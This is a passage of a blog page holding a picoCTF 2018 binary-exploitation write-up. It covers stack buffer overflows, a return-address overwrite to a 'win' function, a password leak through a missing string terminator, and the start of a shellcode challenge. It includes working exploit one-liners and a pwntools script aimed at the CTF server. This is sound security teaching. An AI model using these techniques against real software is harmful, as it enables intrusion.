<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=author content="[map[name:MindYourPrivacy]]">
<meta name=description content="buffer and heap overflow exploitation, format-string, ropchain, use-after-free, aslr ...
">
<meta name=keywords content=",bof,base64,gdb,radare2,objdump,readelf,pwn,struct,shellstorm,checksec,libc-database,ldd,ASLR,ropchain,ropGadget,ELF,format-string,stack-canary,use-after-free">
<meta name=robots content="noodp">
<meta name=theme-color content>
<link rel=canonical href=https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/>
<title>
picoCTF 2018 - Binary Exploitation :: Poney Island — Welcome to Pwnie Island
</title>
<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
<link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css>
<link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png>
<link rel=manifest href=https://0xade1.github.io/site.webmanifest>
<link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d>
<link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico>
<meta name=msapplication-TileColor content="#1b1c1d">
<meta name=theme-color content="#1b1c1d">
<meta itemprop=name content="picoCTF 2018 - Binary Exploitation">
<meta itemprop=description content="buffer and heap overflow exploitation, format-string, ropchain, use-after-free, aslr ...
"><meta itemprop=datePublished content="2019-12-19T00:54:12+08:00">
<meta itemprop=dateModified content="2019-12-19T00:54:12+08:00">
<meta itemprop=wordCount content="6586"><meta itemprop=image content="https://0xade1.github.io">
<meta itemprop=keywords content="bof,base64,gdb,radare2,objdump,readelf,pwn,struct,shellstorm,checksec,libc-database,ldd,ASLR,ropchain,ropGadget,ELF,format-string,stack-canary,use-after-free,">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://0xade1.github.io">
<meta name=twitter:title content="picoCTF 2018 - Binary Exploitation">
<meta name=twitter:description content="buffer and heap overflow exploitation, format-string, ropchain, use-after-free, aslr ...
">
<meta property="og:title" content="picoCTF 2018 - Binary Exploitation">
<meta property="og:description" content="buffer and heap overflow exploitation, format-string, ropchain, use-after-free, aslr ...
">
<meta property="og:type" content="article">
<meta property="og:url" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2019-12-19T00:54:12+08:00">
<meta property="article:modified_time" content="2019-12-19T00:54:12+08:00">
<meta property="og:see_also" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-cryptography/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-forensics/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-general-skills/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-reversing/"><meta property="og:see_also" content="https://0xade1.github.io/posts/2019/12/picoctf-2018-web-exploitation/">
<meta property="article:section" content="picoCTF">
<meta property="article:published_time" content="2019-12-19 00:54:12 +0800 +0800">
</head>
<body>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=https://0xade1.github.io/ style=text-decoration:none>
<div class=logo>
<span class=logo__mark>></span>
<span class=logo__text># cd /root/</span>
<span class=logo__cursor>
</span>
</div>
</a>
<span class=header__right>
<nav class=menu>
<ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<main class=post>
<div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
2019-12-18
|<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://0xade1.github.io/categories/picoctf/>picoCTF</a></span>
|
|<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
<span class=tag><a href=https://0xade1.github.io/series/picoctf/>picoCTF</a></span>
|
</div>
<article>
<h1 class=post-title>
<a href=https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/>picoCTF 2018 - Binary Exploitation</a>
</h1>
<div class=post-info>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://0xade1.github.io/tags/bof/>bof</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/base64/>base64</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/gdb/>gdb</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/radare2/>radare2</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/objdump/>objdump</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/readelf/>readelf</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/pwn/>pwn</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/struct/>struct</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/shellstorm/>shellstorm</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/checksec/>checksec</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/libc-database/>libc-database</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/ldd/>ldd</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/aslr/>ASLR</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/ropchain/>ropchain</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/ropgadget/>ropGadget</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/elf/>ELF</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/format-string/>format-string</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/stack-canary/>stack-canary</a></span>
<span class=tag><a href=https://0xade1.github.io/tags/use-after-free/>use-after-free</a></span>
</p>
</div>
<div class=post-excerpt>buffer and heap overflow exploitation, format-string, ropchain, use-after-free, aslr ...
</div>
<hr>
<aside id=toc>
<div class=toc-title></div>
<link rel=stylesheet href=https://0xade1.github.io/scss/_toc.min.381569c9197e6da109df728dd267dd570bde7f7e967b92d59404483a017f498b00b0434e20302334ff67d09c721024494068c58c94a8a44aa3128e5aef4ef8f0.css integrity="sha512-OBVpyRl+baEJ33KN0mfdVwvef36We5LVlARIOgF/SYsAsENOIDAjNP9n0JxyECRJQGjFjJSopEqjEo5a70748A==">
<div class=toc>
<input id=_toc type=checkbox name=_toc>
<label class=collapse for=_toc>Table of Contents&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline class="chevron-down" points="6 10 14 18 22 10"/><polyline class="chevron-up" points="22 18 14 10 6 18"/></svg>
</label>
<nav id=TableOfContents>
<nav id=TableOfContents>
<ul>
<li><a href=#buffer-overflow-0>buffer-overflow-0</a></li>
<li><a href=#buffer-overflow-1>buffer-overflow-1</a></li>
<li><a href=#leak-me>leak-me</a></li>
<li><a href=#shellcode>shellcode</a></li>
<li><a href=#buffer-overflow-2>buffer-overflow-2</a></li>
<li><a href=#got-2-learn-libc>got-2-learn-libc</a>
<ul>
<li><a href=#spotting-the-buffer-overflow-and-attack-path>Spotting the buffer-overflow and attack path</a></li>
<li><a href=#guessing-the-libc-version>Guessing the libc version</a></li>
<li><a href=#establish-the-libc_base-address-and-system-function-offset>Establish the libc_base address and system function offset</a></li>
<li><a href=#buffer-overflow-exploitation>Buffer overflow exploitation</a></li>
<li><a href=#exploitation>Exploitation</a></li>
</ul>
</li>
<li><a href=#echooo>echooo</a></li>
<li><a href=#authenticate>authenticate</a></li>
<li><a href=#got-shell>got-shell</a></li>
<li><a href=#rop-chain>rop-chain</a></li>
<li><a href=#buffer-overflow-3>buffer-overflow-3</a></li>
<li><a href=#echo-back>echo-back</a></li>
<li><a href=#are-you-root>are-you-root</a></li>
<li><a href=#gps>gps</a></li>
<li><a href=#can-you-gets-me>can-you-gets-me</a></li>
<li><a href=#freecalc>freecalc</a></li>
<li><a href=#sword>sword</a></li>
<li><a href=#contacts>Contacts</a></li>
</ul>
</nav>
</nav>
</div>
</aside>
<hr>
<div class=post-content>
<h2 id=buffer-overflow-0>buffer-overflow-0</h2>
<ul>
<li>source: <a href=./resources/buffer-overflow-0/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/buffer-overflow-0/vuln>vuln</a></li>
</ul>
<p>The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>(<span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>input){
  <span style=color:#8be9fd>char</span> buf[<span style=color:#bd93f9>16</span>];
  strcpy(buf, input);
}
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>./vuln XXXXXXXXXXXXXXXXXXXX</p>
</blockquote>
<h2 id=buffer-overflow-1>buffer-overflow-1</h2>
<ul>
<li>source: <a href=./resources/buffer-overflow-1/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/buffer-overflow-1/vuln>vuln</a></li>
</ul>
<p>The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>(){
  <span style=color:#8be9fd>char</span> buf[BUFSIZE];
  gets(buf);
}
</code></pre></td></tr></table>
</div>
</div><p>With radare2, we can deduct the size of the overflow without dumping a core:</p>
<ol>
<li>the buffer starts at ebp-0x28 (40 bytes)</li>
<li>it is followed by the old ebp (4 bytes)</li>
<li>So the return address to the main function is at offset 44</li>
</ol>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm>[0<span style=color:#50fa7b>x080484d0</span>]<span style=color:#ff79c6>&gt;</span> <span style=color:#8be9fd;font-style:italic>aa</span>
[<span style=color:#50fa7b>x</span>] <span style=color:#8be9fd;font-style:italic>Analyze</span> <span style=color:#8be9fd;font-style:italic>al</span><span style=color:#8be9fd;font-style:italic>l</span> <span style=color:#8be9fd;font-style:italic>flags</span> <span style=color:#8be9fd;font-style:italic>starting</span> <span style=color:#8be9fd;font-style:italic>with</span> <span style=color:#8be9fd;font-style:italic>sym.</span> <span style=color:#8be9fd;font-style:italic>and</span> <span style=color:#8be9fd;font-style:italic>entry0</span> (<span style=color:#8be9fd;font-style:italic>aa</span>)
[0<span style=color:#50fa7b>x080484d0</span>]<span style=color:#ff79c6>&gt;</span> <span style=color:#8be9fd;font-style:italic>pdf</span> @ <span style=color:#8be9fd;font-style:italic>sym.vuln</span>
            <span style=color:#6272a4>; CALL XREF from main @ 0x80486ae</span>
/ 46: <span style=color:#50fa7b>sym.vuln</span> ()<span style=color:#6272a4>;</span>
|           <span style=color:#6272a4>; var int32_t var_28h @ ebp-0x28</span>
|           0<span style=color:#50fa7b>x0804862f</span>      <span style=color:#bd93f9>55</span>             <span style=color:#8be9fd;font-style:italic>push</span> <span style=color:#8be9fd;font-style:italic>ebp</span>
|           0<span style=color:#50fa7b>x08048630</span>      <span style=color:#bd93f9>89</span><span style=color:#8be9fd;font-style:italic>e5</span>           <span style=color:#8be9fd;font-style:italic>mov</span> <span style=color:#8be9fd;font-style:italic>ebp</span>, <span style=color:#8be9fd;font-style:italic>esp</span>
|           0<span style=color:#50fa7b>x08048632</span>      <span style=color:#bd93f9>83</span><span style=color:#8be9fd;font-style:italic>ec28</span>         <span style=color:#8be9fd;font-style:italic>sub</span> <span style=color:#8be9fd;font-style:italic>esp</span>, <span style=color:#bd93f9>0x28</span>
[<span style=color:#50fa7b>...</span>]
[0<span style=color:#50fa7b>x080484d0</span>]<span style=color:#ff79c6>&gt;</span> ! <span style=color:#8be9fd;font-style:italic>python</span> <span style=color:#ff79c6>-</span><span style=color:#8be9fd;font-style:italic>c</span> <span style=color:#f1fa8c>&#39;print 0x28&#39;</span>
40
</code></pre></td></tr></table>
</div>
</div><p>Alternatively, we know the buffer size is 32, so we can trigger a segmentation fault with a crafted message.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python -c <span style=color:#f1fa8c>&#34;print &#39;A&#39;*32 + &#39;1111&#39; + &#39;2222&#39; + &#39;3333&#39; + &#39;4444&#39;&#34;</span> | ./vuln	<span style=color:#6272a4>#crafted message</span>
dmesg | tail -1
<span style=color:#ff79c6>[</span>88469.482647<span style=color:#ff79c6>]</span> vuln<span style=color:#ff79c6>[</span>15175<span style=color:#ff79c6>]</span>: segfault at <span style=color:#bd93f9>34343434</span> ip <span style=color:#bd93f9>0000000034343434</span> sp 00000000ffb84110 error <span style=color:#bd93f9>14</span> in libc-2.31.so<span style=color:#ff79c6>[</span>f7db3000+1e8000<span style=color:#ff79c6>]</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>dmesg</strong> shows <code>eip 34343434</code>, 34 being the ascii for &lsquo;4&rsquo;, we knows the return address occupy the &lsquo;4444&rsquo; in the code below</p>
<p>A successful exploitation of this binary is to return to the win function address which prints the flag. This address can be obtained with objdump:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>objdump -t resources/buffer-overflow-1/vuln | grep win
080485cb g     F .text	<span style=color:#bd93f9>00000064</span>              win
</code></pre></td></tr></table>
</div>
</div><p>To respect the little-endianess of our architecture we will append the return address formatted with <code>struct.pack('&lt;I', 0x80485cb)</code></p>
<ul>
<li><strong>&lt;</strong> stands for Little-endian</li>
<li><strong>I</strong> stands for unsigned int (which is of size 4 bytes)</li>
<li>if the binary was 64bits, we would have used <strong>Q</strong> instead of I</li>
</ul>
<p>The below python scripts allows successful exploitation</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/bin/sh</span>
python <span style=color:#ff79c6>-</span>c <span style=color:#f1fa8c>&#34;import struct; ret = struct.pack(&#39;&lt;I&#39;, 0x80485cb); print &#39;A&#39;*44 + ret&#34;</span> <span style=color:#ff79c6>|</span> <span style=color:#ff79c6>./</span>vuln
</code></pre></td></tr></table>
</div>
</div><p>The python3 implementation is a bit more tricky as print is no longer suitable to write bytearray because it adds \x00; instead we can use sys.stdout.buffer.write
It requires byte-string so make sure to convert your &lsquo;A&rsquo; in byte-string by prefixing</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>python3 <span style=color:#ff79c6>-</span>c <span style=color:#f1fa8c>&#34;import struct; import sys; ret = struct.pack(&#39;&lt;I&#39;, 0x80485cb); sys.stdout.buffer.write(b&#39;A&#39;*44 + ret)&#34;</span> <span style=color:#ff79c6>|</span> <span style=color:#ff79c6>./</span>vuln
</code></pre></td></tr></table>
</div>
</div><h2 id=leak-me>leak-me</h2>
<ul>
<li>source: <a href=./resources/leak-me/auth.c>auth</a></li>
<li>binary: <a href=./resources/leak-me/auth>auth</a></li>
</ul>
<p>The password local variable is immediately followed by the name local in the stack. We can fill the name local with a bunch of &lsquo;A&rsquo;</p>
<pre><code>Higher address
+---------------------------+
|000000000000000000000000000|   password[64]
+---------------------------+
|0000000............AAAAAAAA|   name[256]
+---------------------------+
Lower addres
</code></pre>
<p>Later in the code, a 28 bytes string is appended to the name variable, and therefore it will overflow the password variable if we have written at least 256-27 * &lsquo;A&rsquo; in name</p>
<blockquote>
<p>strcat(name, &ldquo;,\nPlease Enter the Password.");</p>
</blockquote>
<pre><code>+---------------------------+
|000000000000000.drowssaP eh|   password
+---------------------------+
|t retnE esaelP\n,AAA...AAAA|   name
+---------------------------+
</code></pre>
<p>The consequence is there is no longer <code>\x00</code> character in the name variable to mark the end of string, and therefore a latter puts(name) will leak the content of both variables.</p>
<p>Indeed the password is then populated resulting in the below stack:</p>
<pre><code>+---------------------------+
|00000000&lt;--real password--&gt;|   password
+---------------------------+
|t retnE esaelP\n,AAA...AAAA|   name
+---------------------------+
</code></pre>
<p>A latter greeting message calls <code>puts(name)</code> which results in the below output that reveals the password to get the flag: &lsquo;AAAA&mldr;.AAA\nPlease Enter t&lt;&ndash;real password&ndash;>&rsquo;</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>
<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>

DEV<span style=color:#ff79c6>=</span><span style=color:#bd93f9>0</span>

LOCAL_PATH<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;.&#39;</span>
h, p <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>, <span style=color:#bd93f9>38315</span>
PLEASE <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;,</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>Please Enter the Password.&#34;</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process</span>():
  <span style=color:#ff79c6>if</span> DEV:
    <span style=color:#ff79c6>return</span> process(LOCAL_PATH <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#39;/auth&#39;</span>)
  <span style=color:#ff79c6>else</span>:
    <span style=color:#ff79c6>return</span> remote(h, p)

p <span style=color:#ff79c6>=</span> get_process()
p<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#39;your name?</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>, <span style=color:#f1fa8c>&#39;A&#39;</span> <span style=color:#ff79c6>*</span> (<span style=color:#bd93f9>256</span><span style=color:#ff79c6>-</span><span style=color:#8be9fd;font-style:italic>len</span>(PLEASE)))
p<span style=color:#ff79c6>.</span>recvline()		<span style=color:#6272a4>#p.recv() returns only part of the output because server is a bit slow</span>
prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvline()	<span style=color:#6272a4>#so it is better to use p.recvline() instead</span>
pwd_position <span style=color:#ff79c6>=</span> prompt<span style=color:#ff79c6>.</span>find(PLEASE)<span style=color:#ff79c6>+</span><span style=color:#8be9fd;font-style:italic>len</span>(PLEASE)<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>
pwd <span style=color:#ff79c6>=</span> prompt[pwd_position:]<span style=color:#ff79c6>.</span>strip()
p<span style=color:#ff79c6>.</span>sendline(pwd)
<span style=color:#8be9fd;font-style:italic>print</span> p<span style=color:#ff79c6>.</span>recvall()
</code></pre></td></tr></table>
</div>
</div><h2 id=shellcode>shellcode</h2>
<ul>
<li>source: <a href=./resources/shellcode/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/shellcode/vuln>vuln</a></li>
</ul>
<p>This program will execute whatever is in the buf local variable which is of size 148 bytes.</p>
<blockquote>
<p>((void (*)())buf)();</p>
</blockquote>
<p>So we can simply find any smaller shellcode on <a href=http://shell-storm.org/shellcode/>Shell Storm</a> for linux 32 bits architecture</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
